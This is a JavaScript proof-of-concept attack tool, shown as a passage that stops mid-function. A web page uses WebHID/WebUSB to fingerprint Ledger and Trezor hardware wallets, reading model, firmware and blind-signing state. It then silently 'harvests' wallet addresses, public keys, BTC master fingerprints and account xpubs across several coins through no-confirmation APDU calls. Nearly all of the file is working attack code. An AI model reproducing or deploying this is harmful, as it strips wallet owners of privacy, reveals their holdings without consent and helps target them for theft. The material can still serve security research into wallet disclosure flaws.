"use strict";
/* ------------------------------------------------------------------ *
 *  Hardware-wallet fingerprinting + eavesdropping PoC — vanilla JS.   *
 *   PASSIVE  descriptor  → model, firmware-era, HID layout            *
 *   ACTIVE   dashboard APDUs → running app, firmware, blind-signing   *
 *   HARVEST  Ledger getAddress (P1=0, no tap) → ETH account addresses *
 *            Trezor GetFeatures → wallet label, device_id, model      *
 *  Read-only. No signature is ever requested; nothing hits the net.   *
 * ------------------------------------------------------------------ */

const LEDGER_VENDOR_ID = 0x2c97;
const LEDGER_MODELS = {
  0x00: "Blue / bootloader",
  0x10: "Nano S",
  0x40: "Nano X",
  0x50: "Nano S Plus",
  0x60: "Stax",
  0x70: "Flex",
};
const LEDGER_LEGACY = {
  0x0000: "Blue",
  0x0001: "Nano S",
  0x0004: "Nano X",
  0x0005: "Nano S Plus",
  0x0006: "Stax",
  0x0007: "Flex",
};
const TARGET_MODELS = {
  0x31100002: "Nano S",
  0x31100003: "Nano S",
  0x31100004: "Nano S",
  0x31000002: "Blue",
  0x33000004: "Nano X",
  0x33100004: "Nano S Plus",
  0x33200004: "Stax",
  0x33300004: "Flex",
};
// Ledger status words worth decoding for "device state"
const LEDGER_SW = {
  0x9000: "OK",
  0x5515: "device locked (PIN not entered)",
  0x6511: "no app open",
  0x6d00: "INS not supported (wrong app open)",
  0x6e00: "CLA not supported (wrong app open)",
  0x6982: "security status not satisfied",
  0x6985: "user declined / confirmation required by this app version",
  0x6a15: "path/param error",
};
// Trezor + others for the WebUSB detector
const TREZOR_VENDORS = {
  0x1209: "Trezor (WebUSB)",
  0x534c: "Trezor One (legacy)",
};
const KNOWN_USB_VENDORS = {
  0x2c97: "Ledger",
  0x1209: "Trezor / pid.codes",
  0x534c: "Trezor (legacy)",
  0x1050: "Yubico",
  0x3353: "OneKey",
  0x1d50: "KeepKey-range",
};

/* -------------------------- helpers -------------------------- */
const $ = (id) => document.getElementById(id);
const hx = (n, w = 2) => "0x" + (n >>> 0).toString(16).padStart(w, "0");
const bytesHex = (u8) =>
  Array.from(u8)
    .map((b) => b.toString(16).padStart(2, "0"))
    .join(" ");
const ascii = (u8) =>
  Array.from(u8)
    .map((b) => (b >= 32 && b < 127 ? String.fromCharCode(b) : "."))
    .join("");
const utf8 = (u8) => {
  try {
    return new TextDecoder().decode(u8);
  } catch (_) {
    return ascii(u8);
  }
};
const devKey = (d) => `${d.vendorId}:${d.productId}`;
const esc = (s) => String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;");

function log(kind, msg, asciiStr) {
  const el = $("log");
  const cls =
    { tx: "log-tx", rx: "log-rx", err: "log-err", i: "log-i" }[kind] || "log-i";
  const tag =
    { tx: "TX ▶", rx: "◄ RX", err: "ERR  ", i: " •   " }[kind] || " •   ";
  const line = document.createElement("div");
  line.className = cls;
  const stamp = new Date().toISOString().slice(11, 23);
  line.innerHTML =
    `<span class="t">${stamp}</span> ${tag} ${esc(msg)}` +
    (asciiStr !== undefined
      ? ` <span class="log-ascii">ascii="${esc(asciiStr)}"</span>`
      : "");
  el.appendChild(line);
  el.scrollTop = el.scrollHeight;
}
const pill = (t, c) => `<span class="pill ${c}">${esc(t)}</span>`;
function renderTable(id, rows) {
  const t = $(id);
  if (!rows.length) {
    t.innerHTML = `<tr><td class="empty" colspan="2">No data.</td></tr>`;
    return;
  }
  t.innerHTML = rows
    .map(
      ([k, v]) =>
        `<tr><th scope="row">${esc(k)}</th><td class="v">${v}</td></tr>`
    )
    .join("");
}
// append rows to #tSecrets, de-duplicating on key|value and never auto-wiping
const secrets = [];
const secretKeys = new Set();
const foundAddresses = new Set(); // unique wallet addresses, for the live bottom counter
function addSecret(k, v) {
  const id = k + "|" + v;
  if (secretKeys.has(id)) return; // already in the list — don't add it again
  secretKeys.add(id);
  secrets.push([k, v]);
  renderTable("tSecrets", secrets);
}
// add a wallet address row and track it for the unique-address counter
function addAddress(label, addr, { verify = false } = {}) {
  if (!addr) return;
  addSecret(
    label,
    `<span class="hi">${esc(addr)}</span> ${pill("no tap", "bad")}${
      verify ? " " + pill("verify", "warn") : ""
    }`
  );
  foundAddresses.add(addr);
  updateSecretsFooter();
}
function updateSecretsFooter() {
  const el = document.getElementById("secretsFooter");
  if (!el) return;
  const n = foundAddresses.size;
  el.textContent = n
    ? `${n} unique wallet address${
        n === 1 ? "" : "es"
      } harvested — none of them required an on-device confirmation.`
    : "No wallet addresses harvested yet.";
}
function resetSecrets() {
  secrets.length = 0;
  secretKeys.clear();
  foundAddresses.clear();
  renderTable("tSecrets", []);
  updateSecretsFooter();
}

/* ==================================================================
 *  LEDGER — HID APDU transport
 * ================================================================== */
const TAG_APDU = 0x05,
  PACKET = 64,
  HEADER = 5;
function makeBlocks(channel, apdu) {
  const data = new Uint8Array(2 + apdu.length);
  data[0] = (apdu.length >> 8) & 0xff;
  data[1] = apdu.length & 0xff;
  data.set(apdu, 2);
  const blocks = [];
  const chunk = PACKET - HEADER;
  let seq = 0,
    off = 0;
  do {
    const b = new Uint8Array(PACKET);
    b[0] = (channel >> 8) & 0xff;
    b[1] = channel & 0xff;
    b[2] = TAG_APDU;
    b[3] = (seq >> 8) & 0xff;
    b[4] = seq & 0xff;
    b.set(data.subarray(off, off + chunk), HEADER);
    blocks.push(b);
    off += chunk;
    seq++;
  } while (off < data.length);
  return blocks;
}
function assemble(chunks) {
  let total = null;
  const acc = [];
  for (const c of chunks) {
    let off = 5; // channel(2)+tag(1)+seq(2)
    if (acc.length === 0 && total === null) {
      total = (c[5] << 8) | c[6];
      off = 7;
    }
    for (; off < c.length && total !== null && acc.length < total; off++)
      acc.push(c[off]);
    if (total !== null && acc.length >= total) break;
  }
  if (total === null || acc.length < total) return null;
  return new Uint8Array(acc.slice(0, total));
}
let inFlight = 0; // # of live exchanges — spam mode defers while >0
class LedgerHID {
  constructor(device) {
    this.device = device;
    this.channel = Math.floor(Math.random() * 0xffff);
  }
  async open() {
    if (!this.device.opened) await this.device.open();
  }
  exchange(apdu, { quiet = false } = {}) {
    return new Promise((resolve, reject) => {
      const chunks = [];
      let done = false;
      inFlight++;
      const cleanup = () => {
        if (!done) {
          done = true;
          inFlight--;
          this.device.removeEventListener("inputreport", onInput);
        }
      };
      const onInput = (e) => {
        const dv = e.data;
        chunks.push(new Uint8Array(dv.buffer, dv.byteOffset, dv.byteLength));
        const full = assemble(chunks);
        if (full) {
          const len = full.length,
            sw = (full[len - 2] << 8) | full[len - 1],
            body = full.slice(0, len - 2);
          cleanup();
          if (!quiet)
            log("rx", `sw=${hx(sw, 4)} data=[${bytesHex(body)}]`, ascii(body));
          resolve({ data: body, sw });
        }
      };
      this.device.addEventListener("inputreport", onInput);
      (async () => {
        try {
          if (!quiet) log("tx", `apdu=[${bytesHex(apdu)}]`, ascii(apdu));
          for (const b of makeBlocks(this.channel, apdu))
            await this.device.sendReport(0, b);
        } catch (err) {
          cleanup();
          reject(err);
          return;
        }
        setTimeout(() => {
          if (!done) {
            cleanup();
            reject(
              new Error("timeout (locked, or another app holds the device?)")
            );
          }
        }, 6000);
      })();
    });
  }
}
/* ---- Ledger APDU decoders ---- */
function parseAppAndVersion(d) {
  let i = 0;
  const fmt = d[i++];
  const nl = d[i++];
  const name = ascii(d.slice(i, i + nl));
  i += nl;
  const vl = d[i++];
  const version = ascii(d.slice(i, i + vl));
  i += vl;
  let flags = null;
  if (i < d.length) {
    const fl = d[i++];
    flags = ascii(d.slice(i, i + fl));
  }
  return { fmt, name, version, flags };
}
function parseDeviceInfo(d) {
  let i = 0;
  const targetId =
    ((d[i] << 24) | (d[i + 1] << 16) | (d[i + 2] << 8) | d[i + 3]) >>> 0;
  i += 4;
  const sl = d[i++];
  const seVersion = ascii(d.slice(i, i + sl));
  i += sl;
  const fl = d[i++];
  i += fl;
  let mcu = "";
  if (i < d.length) {
    const ml = d[i++];
    mcu = ascii(d.slice(i, i + ml)).replace(/\s+$/, "");
  }
  return { targetId, seVersion, mcu };
}
function parseEthConfig(d) {
  const f = d[0];
  return {
    version: `${d[1]}.${d[2]}.${d[3]}`,
    flagsByte: f,
    blind: !!(f & 1),
    erc20: !!(f & 2),
    stark: !!(f & 4),
    starkV2: !!(f & 8),
  };
}
// BIP32 path -> [count][comp*4 BE]; hardened components must already have 0x80000000 set
function encodePath(components) {
  const out = new Uint8Array(1 + components.length * 4);
  out[0] = components.length;
  components.forEach((c, idx) => {
    const o = 1 + idx * 4;
    out[o] = (c >>> 24) & 0xff;
    out[o + 1] = (c >>> 16) & 0xff;
    out[o + 2] = (c >>> 8) & 0xff;
    out[o + 3] = c & 0xff;
  });
  return out;
}

/* ==================================================================
 *  TREZOR — WebUSB protobuf transport (v1 framing: ?## type len …)
 * ================================================================== */
const TREZOR_EP = 1; // bulk IN 0x81 / OUT 0x01, interface 0
const MSG_GetFeatures = 55,
  MSG_Features = 17;
function trezorFrame(type, payload) {
  const body = new Uint8Array(8 + payload.length); // ## type(2) len(4) payload
  body[0] = 0x23;
  body[1] = 0x23;
  body[2] = (type >> 8) & 0xff;
  body[3] = type & 0xff;
  body[4] = (payload.length >>> 24) & 0xff;
  body[5] = (payload.length >>> 16) & 0xff;
  body[6] = (payload.length >>> 8) & 0xff;
  body[7] = payload.length & 0xff;
  body.set(payload, 8);
  const packets = [];
  for (let off = 0; off < body.length || packets.length === 0; off += 63) {
    const pkt = new Uint8Array(64);
    pkt[0] = 0x3f;
    pkt.set(body.subarray(off, off + 63), 1);
    packets.push(pkt);
    if (off + 63 >= body.length) break;
  }
  return packets;
}
// minimal protobuf reader → {field:[{wt,v|bytes}]}
function parseProto(buf) {
  const f = {};
  let i = 0;
  const varint = () => {
    let v = 0,
      s = 0,
      b;
    do {
      b = buf[i++];
      v += (b & 0x7f) * Math.pow(2, s);
      s += 7;
    } while (b & 0x80);
    return v;
  };
  while (i < buf.length) {
    const tag = varint(),
      field = tag >>> 3,
      wt = tag & 7;
    if (wt === 0) {
      (f[field] ??= []).push({ wt, v: varint() });
    } else if (wt === 2) {
      const len = varint();
      const bytes = buf.slice(i, i + len);
      i += len;
      (f[field] ??= []).push({ wt, bytes });
    } else if (wt === 5) {
      i += 4;
    } else if (wt === 1) {
      i += 8;
    } else break;
  }
  return f;
}
const pStr = (f, n) => (f[n] && f[n][0].bytes ? utf8(f[n][0].bytes) : null);
const pNum = (f, n) => (f[n] && "v" in f[n][0] ? f[n][0].v : null);

async function trezorGetFeatures(dev) {
  await dev.open();
  if (dev.configuration === null) await dev.selectConfiguration(1);
  try {
    await dev.claimInterface(0);
  } catch (e) {
    /* may already be claimed */
  }
  log(
    "tx",
    `Trezor GetFeatures  [${bytesHex(
      trezorFrame(MSG_GetFeatures, new Uint8Array(0))[0].subarray(0, 9)
    )} …]`
  );
  for (const pkt of trezorFrame(MSG_GetFeatures, new Uint8Array(0)))
    await dev.transferOut(TREZOR_EP, pkt);
  // read framed response
  let type = null,
    expected = null;
  const acc = [];
  for (let guard = 0; guard < 64; guard++) {
    const res = await dev.transferIn(TREZOR_EP, 64);
    const p = new Uint8Array(res.data.buffer);
    let off = 1; // strip 0x3f
    if (type === null) {
      off += 2;
      type = (p[3] << 8) | p[4];
      expected = ((p[5] << 24) | (p[6] << 16) | (p[7] << 8) | p[8]) >>> 0;
      off = 9;
    }
    for (; off < 64 && acc.length < expected; off++) acc.push(p[off]);
    if (acc.length >= expected) break;
  }
  const body = new Uint8Array(acc);
  log(
    "rx",
    `Trezor msg type=${type} len=${expected} data=[${bytesHex(
      body.subarray(0, 32)
    )}${body.length > 32 ? " …" : ""}]`,
    ascii(body.subarray(0, 48))
  );
  try {
    await dev.releaseInterface(0);
  } catch (_) {}
  try {
    await dev.close();
  } catch (_) {}
  if (type !== MSG_Features)
    throw new Error("unexpected Trezor message type " + type);
  return parseProto(body);
}

/* ----------------------- passive fingerprint ----------------------- */
function passiveFromHid(device) {
  const mm = (device.productId >> 8) & 0xff,
    isLedger = device.vendorId === LEDGER_VENDOR_ID;
  const model = isLedger
    ? LEDGER_LEGACY[device.productId] ||
      LEDGER_MODELS[mm] ||
      `unknown (MM=${hx(mm)})`
    : "—";
  const usages =
    (device.collections || [])
      .map((c) => `usagePage=${hx(c.usagePage, 4)} usage=${hx(c.usage, 4)}`)
      .join("<br>") || "—";
  renderTable("tPassive", [
    ["Transport", pill("WebHID", "info")],
    [
      "Vendor ID",
      `${hx(device.vendorId, 4)} ${isLedger ? pill("Ledger SAS", "ok") : ""}`,
    ],
    ["Product ID", hx(device.productId, 4)],
    ["Model (from PID)", isLedger ? pill(model, "ok") : model],
    ["Interface / flags", hx(device.productId & 0xff)],
    ["Product name", device.productName ? `“${esc(device.productName)}”` : "—"],
    ["HID collections", `<span class="hi">${usages}</span>`],
    ["Opened", device.opened ? pill("yes", "warn") : "no"],
  ]);
  log(
    "i",
    `HID descriptor: vid=${hx(device.vendorId, 4)} pid=${hx(
      device.productId,
      4
    )} "${device.productName || ""}" → ${model}`
  );
  return { isLedger, model };
}

/* ----------------------- active fingerprint ----------------------- */
async function activeProbe(device) {
  const rows = [];
  const tp = new LedgerHID(device);
  try {
    await tp.open();
    log("i", `device opened, HID channel=${hx(tp.channel, 4)}`);
  } catch (e) {
    renderTable("tActive", [
      ["Status", pill("could not open device", "bad")],
      ["Reason", (e && e.message) || String(e)],
    ]);
    log("err", "open failed: " + ((e && e.message) || e));
    return;
  }
  try {
    const r = await tp.exchange(new Uint8Array([0xb0, 0x01, 0x00, 0x00, 0x00])); // GET_APP_AND_VERSION
    if (r.sw === 0x9000) {
      const a = parseAppAndVersion(r.data);
      const onDash = a.name === "BOLOS";
      rows.push([
        "Device state",
        onDash
          ? pill("unlocked · dashboard", "ok")
          : pill("unlocked · app open", "warn"),
      ]);
      rows.push([
        "Running app",
        onDash ? pill("dashboard (BOLOS)", "info") : pill(a.name, "warn"),
      ]);
      rows.push(["App version", `<span class="hi">${esc(a.version)}</span>`]);
      if (a.flags) rows.push(["App flags", esc(a.flags)]);
      log("i", `app enumerated with NO on-device tap: ${a.name} ${a.version}`);

      if (onDash) {
        try {
          const f = await tp.exchange(
            new Uint8Array([0xe0, 0x01, 0x00, 0x00, 0x00])
          );
          if (f.sw === 0x9000) {
            const info = parseDeviceInfo(f.data);
            const tModel = TARGET_MODELS[info.targetId];
            rows.push([
              "Target ID",
              `${hx(info.targetId, 8)} ${tModel ? pill(tModel, "ok") : ""}`,
            ]);
            rows.push([
              "Firmware (SE)",
              `<span class="hi">${esc(info.seVersion)}</span>`,
            ]);
            if (info.mcu) rows.push(["MCU", esc(info.mcu)]);
            log(
              "i",
              `firmware disclosed: SE ${info.seVersion}, MCU ${
                info.mcu || "?"
              }, target ${hx(info.targetId, 8)}`
            );
          }
        } catch (_) {}
        // battery (experimental: Stax / Flex)
        const bat = await ledgerBattery(tp);
        if (bat.pct !== undefined)
          rows.push(["Battery (experimental)", `${bat.pct}%`]);
        else if (bat.raw)
          rows.push(["Battery (experimental)", `raw ${esc(bat.raw)}`]);
      }
      if (/ethereum|eth/i.test(a.name)) {
        try {
          const c = await tp.exchange(
            new Uint8Array([0xe0, 0x06, 0x00, 0x00, 0x00])
          );
          if (c.sw === 0x9000) {
            const cfg = parseEthConfig(c.data);
            rows.push(["ETH app version", cfg.version]);
            rows.push(["Config flags", hx(cfg.flagsByte)]);
            rows.push([
              "Blind signing (arbitrary data)",
              cfg.blind ? pill("ENABLED", "bad") : pill("disabled", "ok"),
            ]);
            rows.push(["ERC-20 provisioning", cfg.erc20 ? "yes" : "no"]);
            rows.push([
              "Starkware",
              cfg.stark ? (cfg.starkV2 ? "v2" : "v1") : "no",
            ]);
            log(
              "i",
              `ETH config: blind-signing ${
                cfg.blind ? "ENABLED" : "disabled"
              } (flags ${hx(cfg.flagsByte)})`
            );
          }
        } catch (e) {
          rows.push(["ETH config", pill("no response", "warn")]);
        }
        rows.push([
          "Note",
          "request/response transport: a page cannot observe txns another host is signing — only device state + what it can pull itself",
        ]);
        renderTable("tActive", rows);
        await harvestEvm(tp, "ETH"); // <-- silent address harvest
      } else if (/hyperliquid/i.test(a.name)) {
        rows.push([
          "App",
          "Hyperliquid (EVM) — harvesting address (P1=0, no tap)",
        ]);
        renderTable("tActive", rows);
        await harvestEvm(tp, "Hyperliquid");
      } else if (/bitcoin/i.test(a.name)) {
        rows.push([
          "App",
          "Bitcoin — harvesting account xpub + addresses (P1=0, no tap)",
        ]);
        renderTable("tActive", rows);
        await harvestLedgerBtc(tp); // <-- silent xpub + address harvest
      } else if (/solana|\bsol\b/i.test(a.name)) {
        rows.push(["App", "Solana — harvesting addresses (P1=0, no tap)"]);
        renderTable("tActive", rows);
        await harvestSolana(tp);
      } else if (/ripple|xrp/i.test(a.name)) {
        rows.push(["App", "XRP — harvesting addresses (P1=0, no tap)"]);
        renderTable("tActive", rows);
        await harvestXrp(tp);
      } else if (/tron|trx/i.test(a.name)) {
        rows.push(["App", "Tron — harvesting addresses (P1=0, no tap)"]);
        renderTable("tActive", rows);
        await harvestTron(tp);
      } else if (/ton|gram/i.test(a.name)) {
        rows.push(["App", "TON / GRAM — harvesting (experimental)"]);
        renderTable("tActive", rows);
        await harvestTon(tp);
      } else if (!onDash) {
        rows.push([
          "Hint",
          "open a coin app (Ethereum, Bitcoin, Solana, XRP, Tron, TON, Hyperliquid) to harvest addresses",
        ]);
      }
    } else {
      const meaning = LEDGER_SW[r.sw] || "unknown";
      rows.push([
        "Device state",
        r.sw === 0x5515
          ? pill("LOCKED (PIN not entered)", "bad")
          : pill("sw=" + hx(r.sw, 4), "warn"),
      ]);
      rows.push(["GET_APP_AND_VERSION", `${hx(r.sw, 4)} — ${esc(meaning)}`]);
    }
  } catch (e) {
    rows.push(["Probe", pill("failed", "bad")]);
    rows.push(["Reason", (e && e.message) || String(e)]);
    log("err", "probe failed: " + ((e && e.message) || e));
  }
  renderTable("tActive", rows);
}

/* ----------------------- HARVEST: EVM (ETH / Hyperliquid) addresses (no tap) ---------------------- */
async function harvestEvm(tp, label) {
  // secp256k1 m/44'/60'/a'/0/0
  const H = 0x80000000;
  const accounts = [0, 1, 2];
  for (const a of accounts) {
    const path = [44 + H, 60 + H, a + H, 0, 0];
    const data = encodePath(path);
    try {
      const r = await tp.exchange(
        new Uint8Array([0xe0, 0x02, 0x00, 0x00, data.length, ...data])
      ); // P1=0 → NO confirmation
      if (r.sw === 0x9000) {
        const d = r.data;
        let i = 0;
        const pkl = d[i++];
        i += pkl;
        const al = d[i++];
        const addr = ascii(d.slice(i, i + al));
        addAddress(`${label} · m/44'/60'/${a}'/0/0`, "0x" + addr);
        log("i", `HARVESTED ${label} address (no confirmation): 0x${addr}`);
      } else if (r.sw === 0x5515) {
        addSecret(`${label} address`, "device locked");
        break;
      } else {
        addSecret(
          `${label} m/44'/60'/${a}'`,
          `sw=${hx(r.sw, 4)} — ${esc(LEDGER_SW[r.sw] || "unsupported")}`
        );
        break;
      }
    } catch (e) {
      log("err", "getAddress failed: " + ((e && e.message) || e));
      break;
    }
  }
  addSecret("USDC (ERC-20)", "same address as the EVM address above");
}

/* ----------------------- HARVEST: Solana (no tap) ---------------------- */
async function harvestSolana(tp) {
  // GET_PUBKEY (E0 05), address = base58(ed25519 pubkey)
  const H = 0x80000000;
  for (const a of [0, 1, 2]) {
    const path = [44 + H, 501 + H, a + H]; // m/44'/501'/a'  (Ledger Live)
    const data = encodePath(path);
    try {
      const r = await tp.exchange(
        new Uint8Array([0xe0, 0x05, 0x00, 0x00, data.length, ...data])
      ); // P1=0 no confirm
      if (r.sw !== 0x9000) {
        if (r.sw === 0x5515) {
          addSecret("SOL", "device locked");
          return;
        }
        addSecret(
          `SOL m/44'/501'/${a}'`,
          `sw=${hx(r.sw, 4)} — ${esc(LEDGER_SW[r.sw] || "unsupported")}`
        );
        break;
      }
      log("i", `SOL raw=[${bytesHex(r.data)}]`);
      addAddress(`SOL · m/44'/501'/${a}'`, base58(r.data.slice(0, 32)));
    } catch (e) {
      log("err", "SOL: " + ((e && e.message) || e));
      break;
    }
  }
  addSecret("USDC (SPL)", "same address as the SOL address above");
}

/* ----------------------- HARVEST: Tron (no tap) ---------------------- */
async function harvestTron(tp) {
  // GET_PUBLIC_KEY (E0 02); app returns Base58Check T-address
  const H = 0x80000000;
  for (const a of [0, 1, 2]) {
    const path = [44 + H, 195 + H, a + H, 0, 0]; // m/44'/195'/a'/0/0
    const data = encodePath(path);
    try {
      const r = await tp.exchange(
        new Uint8Array([0xe0, 0x02, 0x00, 0x00, data.length, ...data])
      );
      if (r.sw !== 0x9000) {
        if (r.sw === 0x5515) {
          addSecret("TRX", "device locked");
          return;
        }
        addSecret(
          `TRX m/44'/195'/${a}'`,
          `sw=${hx(r.sw, 4)} — ${esc(LEDGER_SW[r.sw] || "unsupported")}`
        );
        break;
      }
      const d = r.data;
      let i = 0;
      const pkl = d[i++];
      i += pkl;
      const al = d[i++];
      const addr = ascii(d.slice(i, i + al));
      log("i", `TRX raw=[${bytesHex(d)}]`);
      addAddress(`TRX · m/44'/195'/${a}'/0/0`, addr);
    } catch (e) {
      log("err", "TRX: " + ((e && e.message) || e));
      break;
    }
  }
  addSecret("USDT/USDC (TRC-20)", "same address as the TRX address above");
}

/* ----------------------- HARVEST: XRP (no tap) ---------------------- */
const XRP_B58 = "rpshnaf39wBUDNEGHJKLM4PQRST7VWXYZ2bcdeCg65jkm8oFqi1tuvAxyz";
function base58Alphabet(bytes, alpha) {
  let zeros = 0;
  while (zeros < bytes.length && bytes[zeros] === 0) zeros++;
  let n = 0n;
  for (const b of bytes) n = (n << 8n) + BigInt(b);
  let out = "";
  while (n > 0n) {
    out = alpha[Number(n % 58n)] + out;
    n /= 58n;
  }
  return alpha[0].repeat(zeros) + out;
}
async function xrpAddress(pk) {
  // classic r-address = xrpBase58Check(0x00 || hash160(pubkey))
  const h = await hash160(pk);
  const payload = new Uint8Array(21);
  payload[0] = 0x00;
  payload.set(h, 1);
  const c = await sha256(await sha256(payload));
  const full = new Uint8Array(25);
  full.set(payload, 0);
  full.set(c.subarray(0, 4), 21);
  return base58Alphabet(full, XRP_B58);
}
async function harvestXrp(tp) {
  // GET_PUBLIC_KEY (E0 02, secp256k1); derive r-address client-side
  const H = 0x80000000;
  for (const a of [0, 1, 2]) {
    const path = [44 + H, 144 + H, a + H, 0, 0]; // m/44'/144'/a'/0/0
    const data = encodePath(path);
    try {
      const r = await tp.exchange(
        new Uint8Array([0xe0, 0x02, 0x00, 0x00, data.length, ...data])
      );
      if (r.sw !== 0x9000) {
        if (r.sw === 0x5515) {
          addSecret("XRP", "device locked");
          return;
        }
        addSecret(
          `XRP m/44'/144'/${a}'`,
          `sw=${hx(r.sw, 4)} — ${esc(LEDGER_SW[r.sw] || "unsupported")}`
        );
        break;
      }
      const d = r.data;
      let i = 0;
      const pkl = d[i++];
      const pk = d.slice(i, i + pkl);
      const addr = await xrpAddress(pk);
      log("i", `XRP raw=[${bytesHex(d)}] → ${addr}`);
      addAddress(`XRP · m/44'/144'/${a}'/0/0`, addr, { verify: true });
    } catch (e) {
      log("err", "XRP: " + ((e && e.message) || e));
      break;
    }
  }
}

/* ----------------------- HARVEST: TON / GRAM (experimental) ---------------------- */
async function harvestTon(tp) {
  // ed25519; on-device address needs the wallet-contract, so show pubkey
  const H = 0x80000000;
  const path = [44 + H, 607 + H, 0 + H]; // m/44'/607'/0'
  const data = encodePath(path);
  try {
    const r = await tp.exchange(
      new Uint8Array([0xe0, 0x05, 0x00, 0x00, data.length, ...data])
    );
    log("i", `TON raw sw=${hx(r.sw, 4)} data=[${bytesHex(r.data)}]`);
    if (r.sw === 0x9000) {
      const pub =
        r.data.length >= 33 && r.data[0] === 32
          ? r.data.slice(1, 33)
          : r.data.slice(0, 32);
      addSecret(
        "TON public key (ed25519)",
        `<span class="hi">${bytesHex(pub).replace(/ /g, "")}</span> ${pill(
          "no tap",
          "bad"
        )}`
      );
      addSecret(
        "TON note",
        "address derivation needs the wallet-contract (v3/v4) stateinit — not computed client-side here"
      );
    } else {
      addSecret(
        "TON",
        `sw=${hx(r.sw, 4)} — ${esc(
          LEDGER_SW[r.sw] ||
            "unsupported (app/path/params differ) — see raw in the log"
        )}`
      );
    }
  } catch (e) {
    log("err", "TON: " + ((e && e.message) || e));
  }
}

/* ----------------------- HARVEST: Ledger BTC account xpub (no tap) ---------------------- *
 *  getWalletPublicKey (INS 0x40, P1=0x00) returns pubkey+chaincode with no confirmation.   *
 *  We serialize the account-level extended pubkey (xpub/zpub) and, as proof that the xpub   *
 *  reveals *every* address, also pull the first receive addresses straight from the device  *
 *  (still P1=0x00). Only client-side crypto used: SHA-256 (WebCrypto) + base58 + point       *
 *  compression — no EC math, no RIPEMD160. Parent fingerprint is zeroed (metadata only; it   *
 *  does not affect child-address derivation by any wallet/explorer that imports the xpub).   */
const _B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
async function sha256(u8) {
  return new Uint8Array(await crypto.subtle.digest("SHA-256", u8));
}
function base58(bytes) {
  let zeros = 0;
  while (zeros < bytes.length && bytes[zeros] === 0) zeros++;
  let n = 0n;
  for (const b of bytes) n = (n << 8n) + BigInt(b);
  let out = "";
  while (n > 0n) {
    out = _B58[Number(n % 58n)] + out;
    n /= 58n;
  }
  return "1".repeat(zeros) + out;
}
async function base58check(payload) {
  const c = await sha256(await sha256(payload));
  const full = new Uint8Array(payload.length + 4);
  full.set(payload, 0);
  full.set(c.subarray(0, 4), payload.length);
  return base58(full);
}
function compressPub(u) {
  // uncompressed 0x04 X(32) Y(32) -> 33-byte compressed
  const out = new Uint8Array(33);
  out[0] = u[64] & 1 ? 0x03 : 0x02;
  out.set(u.slice(1, 33), 1);
  return out;
}
async function serializeXpub(version, depth, childNumber, chainCode, compPub) {
  const p = new Uint8Array(78);
  p[0] = (version >>> 24) & 0xff;
  p[1] = (version >>> 16) & 0xff;
  p[2] = (version >>> 8) & 0xff;
  p[3] = version & 0xff;
  p[4] = depth & 0xff; // bytes 5..8 (parent fingerprint) stay 0
  p[9] = (childNumber >>> 24) & 0xff;
  p[10] = (childNumber >>> 16) & 0xff;
  p[11] = (childNumber >>> 8) & 0xff;
  p[12] = childNumber & 0xff;
  p.set(chainCode.subarray(0, 32), 13);
  p.set(compPub, 45);
  return base58check(p);
}
async function btcGetWalletPubkey(tp, components, p2) {
  const data = encodePath(components);
  const apdu = new Uint8Array([0xe0, 0x40, 0x00, p2, data.length, ...data]); // INS 40, P1=0 → NO confirmation
  const r = await tp.exchange(apdu);
  if (r.sw !== 0x9000) return { sw: r.sw };
  const d = r.data;
  let i = 0;
  const pkl = d[i++];
  const pub = d.slice(i, i + pkl);
  i += pkl;
  const al = d[i++];
  const addr = ascii(d.slice(i, i + al));
  i += al;
  const chain = d.slice(i, i + 32);
  return { sw: 0x9000, pub, addr, chain };
}
/* Dispatch between the legacy Bitcoin app (CLA 0xE0, getWalletPublicKey) and the new
 *  "Bitcoin" app 2.x (app-bitcoin-new, CLA 0xE1) which dropped getWalletPublicKey and
 *  uses GET_MASTER_FINGERPRINT / GET_EXTENDED_PUBKEY instead. */
async function harvestLedgerBtc(tp) {
  let isNew = false;
  try {
    // GET_MASTER_FINGERPRINT (E1 05) — only the new app answers
    const r = await tp.exchange(new Uint8Array([0xe1, 0x05, 0x00, 0x00, 0x00]));
    if (r.sw === 0x9000 && r.data.length >= 4) {
      isNew = true;
      const fp = Array.from(r.data.slice(0, 4))
        .map((b) => b.toString(16).padStart(2, "0"))
        .join("");
      addSecret(
        "BTC master key fingerprint",
        `<span class="hi">${fp}</span> ${pill("no tap", "bad")}`
      );
      log("i", `new Bitcoin app detected (CLA 0xE1); master fingerprint ${fp}`);
    }
  } catch (_) {}
  if (isNew) await harvestBtcNew(tp);
  else await harvestBtcLegacy(tp);
}

/* --- New Bitcoin app 2.x (CLA 0xE1). GET_EXTENDED_PUBKEY (INS 0x00): --------------- *
 *  data = [display(1)][n][path×4]; display=0 → NO confirmation. Response = base58 xpub *
 *  as ASCII. Addresses are derived client-side from device-provided leaf pubkeys.      */
async function btcNewGetXpub(tp, comps) {
  const path = encodePath(comps);
  const data = new Uint8Array(1 + path.length);
  data[0] = 0x00;
  data.set(path, 1); // display=0
  const apdu = new Uint8Array([0xe1, 0x00, 0x00, 0x00, data.length, ...data]);
  const r = await tp.exchange(apdu);
  if (r.sw !== 0x9000) return { sw: r.sw };
  return { sw: 0x9000, xpub: ascii(r.data).trim() };
}
async function harvestBtcNew(tp) {
  const H = 0x80000000;
  const schemes = [
    { name: "Native SegWit", purpose: 84, enc: "bech32" }, // m/84'/0'/0' → bc1q…
    { name: "Nested SegWit", purpose: 49, enc: null }, // m/49'/0'/0' (xpub only)
    { name: "Legacy", purpose: 44, enc: "p2pkh" }, // m/44'/0'/0' → 1…
    { name: "Taproot", purpose: 86, enc: null }, // m/86'/0'/0' (xpub only)
  ];
  let any = false;
  for (const s of schemes) {
    let acct;
    try {
      acct = await btcNewGetXpub(tp, [s.purpose + H, 0 + H, 0 + H]);
    } catch (e) {
      log("err", "GET_EXTENDED_PUBKEY failed: " + ((e && e.message) || e));
      break;
    }
    if (acct.sw !== 0x9000) {
      if (acct.sw === 0x5515) {
        addSecret("BTC", "device locked");
        return;
      }
      addSecret(
        `BTC ${s.name}`,
        `sw=${hx(acct.sw, 4)} — ${esc(
          LEDGER_SW[acct.sw] || "unsupported/declined"
        )}`
      );
      continue;
    }
    any = true;
    addSecret(
      `BTC ${s.name} · account xpub`,
      `<span class="hi break-all">${esc(acct.xpub)}</span> ${pill(
        "no tap",
        "bad"
      )}`
    );
    log("i", `HARVESTED xpub (${s.name}, no confirmation): ${acct.xpub}`);
    if (s.enc) {
